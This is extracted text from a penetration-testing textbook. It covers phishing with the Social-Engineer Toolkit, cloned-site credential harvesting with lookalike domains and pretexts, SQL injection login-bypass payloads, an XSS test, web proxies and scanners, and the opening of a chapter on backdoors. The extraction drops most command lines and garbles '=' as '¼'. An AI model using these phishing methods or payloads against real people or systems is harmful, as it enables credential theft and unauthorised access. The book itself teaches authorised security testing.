In order to make this believable, it is helpful to register a domain name (usually
between $5 and 20) that looks similar to the target website (TrustedSec.com).
For example, say I was cloning a website from TrustedSec called webportal.
trustedsec.com. Registering webportal-trustedsec.com would be a good choice.
Would the end-user notice the difference? Probably not. It is important to always
remember that your attack vector needs to be believable.
[Word Count: 69]

Next, you may be wondering, how do we get users to visit the website?
Remember the previous example when we used a beneﬁts scam in order to create
[Word Count: 28]

FIGURE 5.11
Notice the IP address when using the website.
[Word Count: 10]

FIGURE 5.10
Multiple shells once the victim accepts the Java applet.
[Word Count: 11]

Always, always, always update SET before running it! Dave is a beast when it comes to
coding and updating SET. At the very least, you will get new encrypted payloads every 2 h.
This can be extremely handy in bypassing antivirus.
[Word Count: 41]

a sense of urgency? Any scenario along these lines can be a great starting point.
Remember, in order to make this successful, we need to complete the following
steps:
[Word Count: 29]

Step 1: Set up SET and get it ready to go with all our conﬁgurations (make
sure that SET has access to the Internet).
Step 2: Register a domain name that looks believable.
Step 3: E-mail the company with a credible pretext that has a link to our
malicious domain name.
Step 4: Get shells.
[Word Count: 55]

Remember, the more time and effort you spend on reconnaissance and under-
standing the company, the more successful the attack will be. One last thing,
since this is Java, SET can target any platform including Linux, Mac OS X,
Windows, and more! As an added bonus, it does not matter what version, service
pack, or version of Java is installed.
[Word Count: 60]

In the “website attack vectors”, select option 3 “the credential harvester”, then
select “site cloner”, then enter your (attack machine) IP address and clone any
website you want for example https://gmail.com. Once the website is cloned, use
a target machine to navigate to the cloned website and enter credentials as if you
were logging in. Figure 5.12 shows the cloned website.
[Word Count: 61]

Once the user enters their user name and password, they are redirected back
to the legitimate Gmail website. Moving back to our attack machine (running
SET), we now have the user name and password that was entered by the user.
Figure 5.13 shows the captured credentials.
[Word Count: 46]

We now have the user name and password for the affected Gmail user. Just to be
clear, in this example, as penetration testers, we would not really target Gmail;
that would not make much sense. We would target an Exchange server, an
extranet portal, or something believable that a user will enter their user name
and password so that we can capture and use those credentials to access sensitive
resources of the target company. One of my personal favorites with this attack
vector is an employee satisfaction survey. You start the e-mail off by saying that in
[Word Count: 97]

The Basics of Hacking and Penetration Testing
136
[Word Count: 8]

order to make the company a better place, we are taking a survey of employee
satisfaction and how to make the place better. The ﬁrst 50 employees who ﬁll the
survey out receive a free Apple iPhone and will only take 1 min to complete.
Everyone wants a free iPhone, where is the link? Click click click, credentials
entered, boom. Where is my iPhone?
[Word Count: 64]

FIGURE 5.12
Entering our credentials on the fake Gmail website.
[Word Count: 10]

FIGURE 5.13
Credentials harvested from the website.
[Word Count: 7]

Head back into the main menu within the social-engineering attacks as shown
in Figure 5.14.
[Word Count: 15]

FIGURE 5.14
Inside the social engineering menus.
[Word Count: 7]

The Basics of Hacking and Penetration Testing
138
[Word Count: 8]

Option 7 allows you to spoof short message service text messages as long as you
have an account with the providers.
[Word Count: 21]

Option 8 allows you to create your own WiFi access point out of your computer
including a DHCP and DNS server. When the victim attempts to go to an
individual website, they are redirected back to your computer with the SET
attacks. You could create a captive portal that says you need to accept the Java
applet before you can continue. This is always a good option when targeting
a corporation as a penetration tester.
[Word Count: 75]

Option 9 allows you to create your own QRCode that once scanned, redirect the
scanning machine to your SET (attack) computer. Figure 5.15 is an example that
directs the scanner’s browser to TrustedSec.
[Word Count: 33]

SET is an extremely powerful tool aimed at targeting one of the weakest areas in
any information security program: the users. It is often trivial to call someone on
[Word Count: 29]

FIGURE 5.15
Creating a QRCode through SET.
[Word Count: 7]

the phone and persuade them to visit a website which infects their computer and
fully compromises the machine. Or as previously mentioned, you could use
believable e-mails that coax them into clicking a link. Social engineering success
often hinges on plausibility and credibility. SET makes it extremely simple for
you to be able to create attacks effectively. Be sure to update SET on a regular
basis as it is updated every 2 h.
[Word Count: 73]

The Basics of Hacking and Penetration Testing
140
[Word Count: 8]

n
Spidering: Crawling Your Target’s Website
[Word Count: 6]

n
Cross-Site Scripting: Browsers that Trust Sites
[Word Count: 7]

n
ZAP: Putting it All Together Under One Roof
[Word Count: 9]

Now that you have a good understanding of common network-based attacks, it
is important to take some time to discuss the basics of web-based exploitation.
The web is certainly one of the most common attack vectors available today
because everything is connected to the Internet. Nearly every company today has
[Word Count: 50]

The Basics of Hacking and Penetration Testing. http://dx.doi.org/10.1016/B978-0-12-411644-3.00006-6
Copyright  2013, 2011 Elsevier Inc. All rights reserved.
[Word Count: 17]

a web presence, and more often than not, that web presence is dynamic and
user-driven. Previous-generation websites were simple static pages coded mostly
in hypertext markup language (HTML). By contrast, many of today’s websites
include complex coding with back-end database-driven transactions and mul-
tiple layers of authentication. Home computers, phones, appliances, and of
course systems that belong to our targets are all connected to the Internet.
[Word Count: 66]

As our dependence and reliance on the web continues to expand, so does the
need to understand how this attack vector can be exploited.
[Word Count: 24]

It is important that every aspiring hacker and penetration tester understand at
least the basics of the web-based exploitation.
[Word Count: 19]

The Basics of Hacking and Penetration Testing
142
[Word Count: 8]

your requests as well as the responses from the web application. These toolkits
provide a vast array of functionality, but it all boils down to a couple of main
ideas related to web hacking:
[Word Count: 34]

To view the various options available, you can run the following command from
any command line within Kali:
[Word Count: 18]

Running this command will provide you with a brief description of the switches
available to you. To run a basic vulnerability scan against a target, you need to
specify a host Internet protocol (IP) address with the “eh” switch. You should
also specify a port number with the “ep” switch. Nikto is capable of scanning
single ports, multiple ports, or range of ports. For example, to scan for web
servers on all ports between 1 and 1000, you would issue the following com-
mand in a terminal window:
[Word Count: 88]

To scan multiple ports, which are not contiguous, separate each port to be
scanned with a comma as shown below:
[Word Count: 20]

The Basics of Hacking and Penetration Testing
144
[Word Count: 8]

If you fail to specify a port number, Nikto will only scan port 80 on your target.
If you want to save the Nikto output for later review, you can do so by issuing
the “eo” followed by the ﬁle path and name of the ﬁle you would like to use to save
the output. Figure 6.1 includes a screenshot of the Nikto output from our example.
[Word Count: 67]

The w3af is an awesome tool for scanning and exploiting web resources. w3af
provides an easy-to-use interface that allows penetration testers to quickly and
easily identify nearly all the top web-based vulnerabilities including SQL
injection, XSS, ﬁle includes, cross-site request forgery, and many more.
[Word Count: 44]

w3af is easy to setup and use; this makes it very handy for people who are new to
web penetration testing. You can access w3af by clicking on the Applica-
tions / Kali Linux / Web Applications / w3af as shown in Figure 6.2.
[Word Count: 44]

w3af can also be accessed via the terminal and issuing the ﬂowing command:
[Word Count: 13]

When w3af starts, you will be presented with a Graphical User Interface (GUI)
similar to Figure 6.3.
[Word Count: 17]

The main w3af window allows you to set up and customize your scan. On the
left side of the screen, you will ﬁnd a “Proﬁles” window. Selecting one of the
[Word Count: 30]

FIGURE 6.1
Output of Nikto web vulnerability scanner.
[Word Count: 8]

FIGURE 6.2
Kali menu to access and start w3af GUI.
[Word Count: 10]

The Basics of Hacking and Penetration Testing
146
[Word Count: 8]

Once you have selected your desired proﬁle, you can enter an IP address or URL
into the “Target” input box. With your scanning proﬁle and target designated,
you can click the “Start” button to begin the test. Depending on which test you
chose and the size of your target, the scan may take anywhere from a few seconds
to several hours.
[Word Count: 61]

When the scan completes, the “Log”, “Results”, and “Exploit” tabs will become
active and you can review your ﬁndings by clicking through each of these.
Figure 6.4 shows the result of our scan. Notice, the check boxes from “Infor-
mation” and “Error” have been removed. This allows us to focus on the most
serious issues ﬁrst.
[Word Count: 56]

Finally, it is important to understand that you can also run w3af from the ter-
minal. As always, it is highly recommended that you take time to explore and get
to know this option as well.
[Word Count: 36]

SPIDERING: CRAWLING YOUR TARGET’S WEBSITE
[Word Count: 5]

Another great tool to use when initially interacting with a web target is Web-
Scarab. WebScarab was written by Rogan Dawes and is available through the
OWASP website. If you are running Kali, a version of WebScarab is already
installed. This powerful framework is modular in nature and allows you to load
numerous plug-ins to customize it to your needs. Even in its default conﬁg-
uration, WebScarab provides an excellent resource for interacting with and
interrogating web targets.
[Word Count: 78]

After switching to the full-featured interface, you will be prompted to restart
WebScarab. Once you restart the tool, you will be given access to a number of
new panels along the top of the window including the “Spider” tab.
[Word Count: 39]

FIGURE 6.5
Switching webscarab to run in full-featured interface mode.
[Word Count: 10]

The Basics of Hacking and Penetration Testing
148
[Word Count: 8]

Now that you have WebScarab loaded, you need to conﬁgure your browser to
use a proxy. Setting up WebScarab as your proxy will cause all the web trafﬁc
going into and coming out of your browser to pass through the WebScarab
program. In this respect, the proxy program acts as a middleman and has the
ability to view, stop, and even manipulate network trafﬁc.
[Word Count: 64]

Setting up your browser to use a proxy is usually done through the preferences or
network options. In Iceweasel (default in Kali Linux), you can click on
Edit / Preferences. In the Preferences window, click the “Advanced” menu
followed by the “Network” tab. Finally, click on the “Settings” button as shown
in Figure 6.6.
[Word Count: 54]

Clicking on the settings button will allow you to conﬁgure your browser to use
WebScarab as a proxy. Select the radio button for “Manual proxy conﬁguration:”.
Next, enter: 127.0.0.1 in the “hypertext transfer protocol (HTTP) proxy:” input
box. Finally enter: 8008 into the “Port” ﬁeld. It is usually a good idea to check
the box just below the “HTTP proxy” box and select “Use this proxy server for all
protocols”. Once you have all this information entered, you can click “Ok” to
exit the Connection Settings window and “Close” to exit the Preferences
window.
[Word Count: 94]

Figure 6.7 shows an example of the Connection Settings window.
[Word Count: 10]

At this point, any web trafﬁc coming into or passing out of your browser will
route through the WebScarab proxy. There are two words of warning. First, you
[Word Count: 28]

FIGURE 6.6
Setting up iceweasel to use webscarab as a proxy.
[Word Count: 11]

need to leave WebScarab running while it is serving as a proxy. If you close the
program, you will not be able to browse the Internet. If this happens, Iceweasel
will provide you with an error message that it cannot ﬁnd a proxy and you will
need to restart WebScarab or change your network conﬁguration in Iceweasel.
The second warning is that while surﬁng the Internet using a local proxy, all https
trafﬁc will show up as having an invalid certiﬁcate! This is an expected behavior
because your proxy is sitting in the middle of your connection.
[Word Count: 97]

As a side note, it is important that you always pay attention to invalid security
certiﬁcates when browsing. At this point, certiﬁcates are your best defense and
often your only warning against a man-in-the-middle attack.
[Word Count: 35]

You can now view each of the ﬁles and folders associated with your target
website. Individual folders can be further spidered by right clicking and
[Word Count: 25]

FIGURE 6.7
Connection settings for using webscarab as a proxy.
[Word Count: 10]

The Basics of Hacking and Penetration Testing
150
[Word Count: 8]

choosing “Spider tree” again. You should spend time carefully examining every
nook and cranny within your authorized scope. Spidering a website is a great
way to ﬁnd inadvertently or leaked conﬁdential data from a target website.
[Word Count: 36]

Consider the following: some poorly coded websites rely on the use of hidden
ﬁelds to transmit information to and from the client. In these instances, the
programmer makes use of a hidden ﬁeld on the form, assuming that the user will
not be able to access it. Although this assumption is true for a normal user,
anyone leveraging the power of a proxy server will have the ability to access and
modify the hidden ﬁeld.
[Word Count: 75]

FIGURE 6.8
Using webscarab to spider the target website.
[Word Count: 9]

Although this scenario is not as common as it used to be, it certainly demon-
strates the power of using a proxy to intercept and inspect HTTP requests and
responses.
[Word Count: 30]

To use WebScarab as an interceptor, you need to conﬁgure your browser to use
a proxy and start WebScarab as discussed in the “Spidering” section of this
chapter. You will also need to conﬁgure WebScarab to use the “lite” version. You
can switch back to the “lite” version by starting the program, clicking on the
“Tools” menu option and checking the “Use Lite interface” option. Once
WebScarab has ﬁnished loading, you will need to click on the “Intercepts tab”.
Next, you should put a checkbox in both the “Intercept requests” and “Intercept
responses” as shown in Figure 6.9.
[Word Count: 98]

At this point, you can use Iceweasel to browse through your target website.
[Word Count: 13]

Just a word of warningdyou may want to leave the Intercept requests and Intercept
responses unchecked until you are ready to test, as nearly every page involves these
actions and intercepting everything before you are ready will make your browsing expe-
rience painfully slow.
[Word Count: 44]

With WebScarab set up as described, the proxy will stop nearly every transaction
and allow you to inspect or change the data. Luckily if you ﬁnd yourself in this
situation, WebScarab has included a “Cancel ALL Intercepts” button. This can be
handy to keep moving forward.
[Word Count: 46]

To change the values of a given ﬁeld, wait for WebScarab to intercept the request;
then locate the variable you wish to change. At this point, you can simply enter
a new value in the “value” ﬁeld and click the “Insert” button to update the ﬁeld
with the new value.
[Word Count: 50]

FIGURE 6.9
Setting up webscarab to intercept requests and responses.
[Word Count: 10]

The Basics of Hacking and Penetration Testing
152
[Word Count: 8]

Viewing HTTP response and requests can also be useful for discovering user-
name and password information. Just remember, the value in many of these
ﬁelds will be Base64 encoded. Although these values may look as though they
are encrypted, you should understand that Base64 is a form of encoding not
encryption. Although these processes may sound similar, they are vastly
different. Decoding Base64 is a trivial task that can be accomplished with little
effort using a program or an online tool.
[Word Count: 81]

It should be pointed out that there are many good proxy servers available to
assist you with the task of data interception. Do not be afraid to explore other
proxy servers as well.
[Word Count: 33]

Understanding what an interpreted language is and how it works is the key to
understanding injection attacks. Knowing that user input will often be used to
[Word Count: 26]

build code that is executed on the target system, injection attacks focus on
submitting, sending, and manipulating user-driven input. The goal of sending
manipulated input or queries to a target is to get the target to execute unintended
commands or return unintended information back to the attacker.
[Word Count: 47]

The classic example of an injection attack is SQL injection. SQL is a program-
ming language that is used to interact with and manipulate data in a database.
Using SQL, a user can read, write, modify, and delete data stored in the data-
base tables. Recall from our example above that the user supplied a search
string “16 GB RAM” to the web application (an e-commerce website). In this
case, the web application generated an SQL statement based off of the user
input.
[Word Count: 83]

It is important that you understand there are many different ﬂavors of SQL and
different vendors may use different verbs to perform the same actions. Speciﬁc
statements that work in Oracle may not work in MySQL or MSSQL. The infor-
mation contained below will provide a basic and generic framework for inter-
acting with most applications that use SQL, but you should strive to learn the
speciﬁc elements for your target.
[Word Count: 71]

SELECT * FROM product WHERE category ¼ ‘laptop’;
[Word Count: 8]

It is important to remember that in real life, most SQL statements you will
encounter are much more complex than this example. Oftentimes, an SQL query
will interact with several columns from several different tables in the same query.
However, armed with this basic SQL knowledge, let us examine this statement
a little more closely. We should be able to clearly see that in our example, the
user created the value to the right of the “¼” sign, whereas the original
programmer created everything to the left of the “¼” sign. We can combine this
[Word Count: 95]

The Basics of Hacking and Penetration Testing
154
[Word Count: 8]

knowledge with a little bit of SQL syntax to produce some unexpected results.
The programmer built an SQL statement that was already fully constructed
except for the string value to be used in the WHERE clause. The application
accepts whatever the user types into the “search” textbox and appends that string
value to the end of the already created SQL statement. Last, a ﬁnal single quote is
appended onto the SQL statement to balance the quotes. It looks like this when
it is all done:
[Word Count: 85]

SELECT * FROM product WHERE category ¼ ‘laptop’
[Word Count: 8]

In this case, SELECT * FROM product WHERE category ¼ ‘is created ahead of
time by the programmer, while the word laptop is user-supplied and the ﬁnal’ is
appended by the application to balance quotes.
[Word Count: 35]

Also notice that when the actual SQL statement was built, it included single
quotes around the word “laptop”. SQL adds these because “category” is a string
data type in the database. They must always be balanced, that is, there must be
an even number of quotes in the statement, so an SQL syntax error does not
occur. Failure to have both an opening and a closing quote will cause the SQL
statement to error and fail.
[Word Count: 76]

Suppose that rather than simply entering the keyword, laptop, Ben entered the
following into the search box:
[Word Count: 17]

In this case, the following SQL statement would be built and executed:
[Word Count: 12]

SELECT * FROM product WHERE category ¼ ‘laptop’ or 1 ¼ 1--’
[Word Count: 12]

By adding the extra quote, Ben would close off the string containing the user-
supplied word of ‘laptop’ and add some additional code to be executed by the
SQL server, namely
[Word Count: 31]

The key to understanding how to use SQL injections is to understand the sub-
tleties in how the statements are constructed.
[Word Count: 21]

On the whole, the example above may not seem too exciting; instead of
returning all the rows containing the keyword laptop, we were able to return the
[Word Count: 27]

whole table. However, if we apply this type of attack to a slightly different
example, you may ﬁnd the results a bit more sensational.
[Word Count: 24]

Many web applications use SQL to perform authentication. You gain access to
restricted or conﬁdential locations and material by entering a username and
password. As in the previous example, oftentimes this information is
constructed from a combination of user-supplied input, the username and
password, and programmer-constructed statements.
[Word Count: 47]

Consider the following example. The network admin Ben Owned has created
a new website that is used to distribute conﬁdential documents to the company’s
key strategic partners. Partners are given a unique username and password to log
into the website and download material. After setting up his secure website, Ben
asks you to perform a penetration test against the site to see if you can bypass his
authentication.
[Word Count: 68]

You should start this task by using the same technique we examined to return
all the data in the “products” table. Remember the “--” is a common way of
commenting out any code following the “--”. As a result, in some instances, it is
possible to simply enter a username followed by the “--” sequence. If inter-
preted correctly, this can cause the SQL statement to simply bypass or ignore
the section of code that checks for a password and gives you access to the
speciﬁed user. However, this technique will only work if you already know the
username.
[Word Count: 99]

If you do not know the username, you should begin by entering the following
into the username textbox:
[Word Count: 18]

SELECT * FROM users WHERE uname ¼ “or 1 ¼ 1-- and pwd ¼ ‘syngress’”
[Word Count: 15]

At this point, you should either have a username or be prepared to access the
database with the ﬁrst user listed in the database. If you have a username, we
need to attack the password ﬁeld; here again we can enter the statement:
[Word Count: 43]

Because we are using an “or” statement, regardless of what is entered before the
ﬁrst single quote, the statement will always evaluate to true. Upon examining
this statement, the interpreter will see that the password is true and grant access
[Word Count: 40]

The Basics of Hacking and Penetration Testing
156
[Word Count: 8]

to the speciﬁed user. If the username parameter is left blank, but the rest of the
statement is executed, you will be given access to the ﬁrst user listed in the
database.
[Word Count: 32]

In this instance, assuming we have a username, the new SQL statement would
look similar to the following:
[Word Count: 18]

SELECT * FROM users WHERE uname ¼ ‘admin’ and pwd ¼ ‘’ or 1 ¼ 1--
[Word Count: 16]

In many instances, the simple injection above will grant you full access to the
database as the ﬁrst user listed in the “users” table.
[Word Count: 24]

In all fairness, it should be pointed out that it is becoming harder to ﬁnd SQL
injection errors and bypass authentication using the techniques listed above.
Injection attacks are now much more difﬁcult to locate. However, this classic
example still rears its head on occasion, especially with custom-built apps, and it
also serves as an excellent starting point for learning about and discovering the
more advanced injection attacks.
[Word Count: 68]

CROSS-SITE SCRIPTING: BROWSERS THAT
TRUST SITES
[Word Count: 6]

XSS is the process of injecting scripts into a web application. The injected script
can be stored on the original web page and run or processed by each browser
that visits the web page. This process happens as if the injected script was actually
part of the original code.
[Word Count: 49]

XSS is different from many other types of attacks as XSS focuses on attacking the
client, not the server. Although the malicious script itself is stored on the web
application (server), the actual goal is to get a client (browser) to execute the
script and perform an action.
[Word Count: 48]

It is important to point out that the end result or damage caused by a successful
XSS attack can vary widely. In some instances, the effect is a mere annoyance like
a persistent pop-up window, whereas other more serious consequences can
result in the complete compromise of the target. Although many people initially
reject the seriousness of XSS, a skilled attacker can use the attack to hijack
sessions, gain access to restricted content stored by a website, execute commands
on the target, and even record keystrokes!
[Word Count: 86]

You should understand that there are numerous XSS attack vectors. Aside from
simply entering code snippets into an input box, malicious hyperlinks or scripts
can also be embedded directly into websites, e-mails, and even instant messages.
Many e-mail clients today automatically render HTML e-mail. Oftentimes, the
malicious portion of a malicious URL will be obfuscated in an attempt to appear
more legitimate.
[Word Count: 62]

In its simplest form, conducting a XSS attack on a web application that does
not perform input sanitization is easy. When we are only interested in
providing proof that the system is vulnerable, we can use some basic Java-
Script to test for the presence of XSS. Website input boxes are an excellent
place to start. Rather than entering expected information into a textbox,
a penetration tester should attempt to enter the script tag followed by
a JavaScript “alert” directly into the ﬁeld. The classic example of this test is
listed below:
[Word Count: 92]

If the above code is entered and the server is vulnerable, a JavaScript “alert”
pop-up window will be generated. Figure 6.10 shows an example of a typical
web page where the user can login by entering a username and password into the
textboxes provided.
[Word Count: 44]

However, as previously described, rather than entering a normal username and
password, enter the test script. Figure 6.11 shows an example of the test XSS
before submitting.
[Word Count: 27]

FIGURE 6.10
Example of input boxes on a typical web page.
[Word Count: 11]

The Basics of Hacking and Penetration Testing
158
[Word Count: 8]

After entering our test script, we are ready to click the “Submit” button.
Remember if the test is successful and the web application is vulnerable to XSS,
a JavaScript “alert” window with the message “XSS Test” should appear on the
client machine. Figure 6.12 shows the result of our test, providing proof that the
application is vulnerable to XSS.
[Word Count: 59]

Just as there are several attack vectors for launching XSS, the attack itself comes in
several varieties. Because we are covering the basics, we will look at two
examples: reﬂected XSS and stored XSS.
[Word Count: 34]

Reﬂected cross-site scripts occur when a malicious script is sent from the client
machine to a vulnerable server. The vulnerable server then bounces or reﬂects
the script back to the user. In these cases, the payload (or script) is executed
immediately. This process happens in a single response/request. This type of XSS
attack is also known as a “First-Order XSS”. Reﬂected XSS attacks are non-
persistent. Thus, the malicious URL must be fed to the user via e-mail, instant
message, and so on, so the attack executes in their browser. This has a phishing
feel to it and rightfully so.
[Word Count: 100]

In some instances, the malicious script can actually be saved directly on the
vulnerable server. When this happens, the attack is called a stored XSS. Because
the script is saved, it gets executed by every user who accesses the web
application. In the case of stored XSS attacks, the payload itself (the malicious
script or malformed URL) is left behind and will be executed at a later time.
These attacks are typically saved in a database or an applet. Stored XSS does
not need the phishing aspect of reﬂected XSS. This helps the legitimacy of the
attack.
[Word Count: 97]

As mentioned earlier, XSS is a very practical attack. Even though we only
examined the simplest of XSS attacks, do not let this deter you from learning
about the true power of XSS. In order to truly master this content, you
will need to learn how to harness the power of XSS attacks to steal sessions
from your target and deliver the other payloads discussed earlier in this
section. Once you have mastered both reﬂected and stored XSS attacks, you
should begin examining and studying Document Object Model-based XSS
attacks.
[Word Count: 90]

ZED ATTACK PROXY: BRINGING IT ALL TOGETHER
UNDER ONE ROOF
[Word Count: 10]

Before using ZAP, you will need to conﬁgure your browser to use a proxy. You
can review this process by visiting the “Spidering” section of this chapter. Please
note you will need to enter a port number of 8080 rather than 8008 as shown in
Figure 6.13.
[Word Count: 47]

After conﬁguring the proxy settings in your browser and starting ZAP, as you
browse web pages using Iceweasel, the ZAP “Sites” tab will keep a running
history of the URL you visit. You can expand each URL to show additional di-
rectories and pages that you have either visited directly or have been scraped by
ZAP. Figure 6.14 shows we have visited www.dsu.edu, www.espn.com, and www.
google.com and a couple of others.
[Word Count: 72]

FIGURE 6.13
Conﬁguring the iceweasel proxy settings to use the ZAP.
[Word Count: 11]

The Basics of Hacking and Penetration Testing
160
[Word Count: 8]

INTERCEPTING IN ZAP
The ability to intercept and change variables before they reach the website is one
of the ﬁrst places you should start with web hacking. Because accepting variables
from user’s requests is fundamental to how the web works today, it is important
to check and see if the website is securely handling these input variables.
A simple way to think about this is to build requests that ask these questions:
[Word Count: 72]

n
What would the website do if I tried to order 5 (negative 5) televisions?
[Word Count: 15]

n
What would the website do if I tried to get a $2000 television for $49?
[Word Count: 16]

n
What would the website do if I tried to sign in without even providing a user-
name or password variable? (Not supplying blank username and password
variables, but actually not even sending these two variables that the website
is surely expecting.)
[Word Count: 42]

n
What would the website do if I used a cookie (session identiﬁer) from a differ-
ent user that is already currently logged in?
[Word Count: 24]

n
And any other mischievous behavior you can think of!
[Word Count: 10]

FIGURE 6.15
Setting break points on all outbound requests in ZAP.
[Word Count: 11]

FIGURE 6.14
The “sites” tab in ZAP showing visited websites that have passed through the proxy.
[Word Count: 16]

The right-facing green arrow is to set a break point on all outbound requests, so
they will be intercepted and available to be edited; as previously mentioned, this
is the most common use of break points. It is less common to intercept the
returning response from the website. However, when you want to intercept
returning responses, you can toggle the left-facing green arrow. Once you have
the break points set, the arrow will turn red and the request that is leaving your
browser will be displayed in the left pane of ZAP as shown in Figure 6.16.
[Word Count: 97]

Obviously just changing the search term of this Google search for new golf clubs
is not malicious (you can simply type in a new value!), but this does show how
easy any variable can be manipulated. Imagine if this was a banking website and
you were trying to change the account number to transfer money to and from!
[Word Count: 58]

FIGURE 6.16
An intercepted request headed to google.com where the “search” variable is available to be edited.
[Word Count: 17]

FIGURE 6.17
Opening the attack menu in ZAP.
[Word Count: 8]

The Basics of Hacking and Penetration Testing
162
[Word Count: 8]

Notice that both scanning and spidering are available in this “Attack” menu. It is
really that easy; you just ﬁnd the URL or directory (or even page) that you would
like to attack and instruct ZAP to do its thing! Once you select “Spider site” from
the “Attack” menu, the spider tab will display the discovered pages complete
with a status bar to show the progress of the spider tool.
[Word Count: 70]

SCANNING IN ZAP
Once the spider has completed its work, the next step is to have the vulnerability
scanner in ZAP further probe the selected website for known vulnerabilities. A web
scanner is very similar to Nessus that is loaded with signatures of known vulner-
abilities, so the scanner results are only as good as the signatures that it includes.
[Word Count: 60]

ZAP also has passive scanning functionality, which does not send hundreds of
proof-of-concept requests, but instead simply analyzes every response that your
browser receives during normal browsing for the same vulnerabilities as active
scanning. This means you can browse like you normally do and review
the website for vulnerabilities without raising any suspicion from rapid requests
like active scanning.
[Word Count: 59]

All the scanning results will be housed in the “Alerts” tab for easy review. The full
report of ZAP Scanner’s ﬁndings can be exported as HTML or Extensible Markup
Language via the “Reports” menu.
[Word Count: 34]

HOW DO I PRACTICE THIS STEP?
As mentioned at the beginning of this chapter, it is important that you learn to
master the basics of web exploitation. However, ﬁnding vulnerable websites on
which you are authorized to conduct these attacks can be difﬁcult. Fortunately,
the ﬁne folks at the OWASP organization have developed a vulnerable platform
for learning and practicing web-based attacks. This project, called WebGoat, is
an intentionally misconﬁgured and vulnerable web server.
[Word Count: 74]

WebGoat was built using J2EE, which means it is capable of running on any
system that has the Java Runtime Environment installed. WebGoat includes
more than 30 individual lessons that provide a realistic, scenario-driven learning
environment. Current lessons include all the attacks we described in this chapter
and many more. Most lessons require you to perform a certain attack like using
[Word Count: 61]

SQL injection to bypass authentication. Each lesson comes complete with hints
that will help you solve the puzzle. As with other scenario-driven exercises, it is
important to work hard and attempt to ﬁnd the answer on your own before
using the help ﬁles.
[Word Count: 43]

If you are making use of virtual machines in your hacking lab, you will need to
download and install WebGoat inside a virtual machine. As discussed previ-
ously, WebGoat will run in either Linux or Windows, just be sure to install Java
(JRE) on your system prior to starting WebGoat.
[Word Count: 50]

If everything went properly, you will be presented with a login prompt. Both the
username and password are set to: guest.
[Word Count: 21]

As a ﬁnal note, please pay attention to the warnings posted in the “readme” ﬁle.
Speciﬁcally you should understand that running WebGoat outside of a lab
environment is extremely dangerous, as your system will be vulnerable to
attacks. Always use caution and only run WebGoat in a properly sandboxed
environment.
[Word Count: 50]

You can also download and install Damn Vulnerable Web App (DVWA) from
http://www.dvwa.co.uk/. DVWA is another intentionally insecure application
that utilizes PHP and MySQL to provide you with a testing environment.
[Word Count: 31]

If you are interested in learning more about web hacking, check out the Syngress
Book titled The Basics of Web Hacking: Tools and Techniques to Attack the Web by
Dr Josh Pauli. It is an excellent read and will pick up nicely where this chapter
left off.
[Word Count: 47]

The Basics of Hacking and Penetration Testing
164
[Word Count: 8]

When it comes to web security, it is hard to beat OWASP. As previously men-
tioned, a good place to start is the OWASP Top Ten Project. You can ﬁnd the list
at http://www.owasp.org website or by searching Google for “OWASP top ten”.
You should keep a close eye on this list, as it will continue to be updated and
changed as the trends, risks, and threats evolve.
[Word Count: 68]

It should be pointed out that the WebSecurify tool we discussed earlier in the
chapter is capable of automatically testing for all threat categories listed in the
OWASP Top Ten Projects!
[Word Count: 31]

Since we are talking about OWASP and they have graciously provided you
a fantastic tool to learn about and test web application security, there are many
beneﬁts of joining the OWASP organization. Once you are a member, there are
several different ways to get involved with the various projects and continue to
expand your knowledge of web security.
[Word Count: 58]

Along with the great WebScarab project, you should explore other web proxies as
well. Both the Burp Proxy and Paros Proxy are excellent (and free) tools for
intercepting requests, modifying data, and spidering websites.
[Word Count: 34]

Finally, there are several great tools that every good web penetration tester should
become familiar with. One of my colleagues and close friends is a very skilled web
app penetration tester and he swears up and down that Burp Suite is the best
application testing tool available today. After reviewing many web auditing tools,
it is clear that Burp is indeed a great tool. A free version of the Burp Suite is built
into Kali and can be found by clicking on the Applications / Kali Linux / Web
Applications / Web Application Proxies / Burp Suite.
[Word Count: 97]

If you are not using Kali, the free version of Burp can be downloaded from the
company’s website at http://portswigger.net/burp/download.html.
[Word Count: 20]

CHAPTER 7
Post Exploitation and
Maintaining Access with
Backdoors, Rootkits,
and Meterpreter
[Word Count: 12]

n
Hacker Defender: It is Not What You Think
[Word Count: 9]

n
Detecting and Defending Against Rootkits
[Word Count: 6]

n
Meterpreter: The Hammer that Turns Everything into a Nail
[Word Count: 10]

Maintaining access to a remote system is a serious activity that needs to be
discussed and clearly explained to the client. Many companies are interested in
having a penetration test performed but are leery of allowing the penetration
testing company to make use of backdoors. Most people are afraid that these
backdoors will be discovered and exploited by an unauthorized third party.
Imagine that you are the chief executive ofﬁcer of a company, how well would
[Word Count: 76]

The Basics of Hacking and Penetration Testing. http://dx.doi.org/10.1016/B978-0-12-411644-3.00007-8
Copyright  2013, 2011 Elsevier Inc. All rights reserved.
[Word Count: 17]

you sleep knowing that you may have an open, backdoor channel into your
network? Remember, the client sets both the scope and the authorization of the
penetration test. You will need to take the time to fully cover and discuss this step
before proceeding.
[Word Count: 44]

In the simplest sense, a backdoor is a piece of software that resides on the
target computer and allows the attacker to return (connect) to the machine at
any time. In most cases, the backdoor is a hidden process that runs on the target
machine and allows a normally unauthorized user to control the personal
computer (PC).
[Word Count: 57]

It is important to understand that many exploits are ﬂeeting. They work and
provide access only as long as the program that was exploited remains running.
Oftentimes, when the target machine reboots or the exploited process is stop-
ped, the original shell (remote access) will be lost. As a result of this, one of the
ﬁrst tasks to complete upon gaining access to a system is to migrate your shell to
a more permanent home. This is often done through the use of backdoors.
[Word Count: 84]

Later in the chapter, we will discuss rootkits. Rootkits are a special kind of
software that embed themselves deep into the operating system and perform
a number of tasks, including giving a hacker the ability to complete hide pro-
cesses and programs.
[Word Count: 42]

At the end of the chapter, we will wrap things up by reviewing one of the most
popular and powerful exploitation payloads available in Metasploit, the
Meterpreter shell. Utilizing and understanding how to leverage Meterpreter is
a powerful tool for post exploitation.
[Word Count: 42]

NETCAT: THE SWISS ARMY KNIFE
Netcat is an incredibly simple and unbelievably ﬂexible tool that allows com-
munication and network trafﬁc to ﬂow from one machine to another. Although
Netcat’s ﬂexibility makes it an excellent choice for a backdoor, there are dozens
of additional uses for this tool. Netcat can be used to transfer ﬁles between
machines, conduct port scans, serve as a lightweight communication tool
allowing instant messenger/chat functionality, and even work as a simple web
server! We will cover the basics here, but you should spend time practicing and
[Word Count: 91]

The Basics of Hacking and Penetration Testing
168
[Word Count: 8]

playing with Netcat. You will be amazed at what this tool is capable of. It is
nicknamed the “swiss army knife” for a reason.
[Word Count: 24]

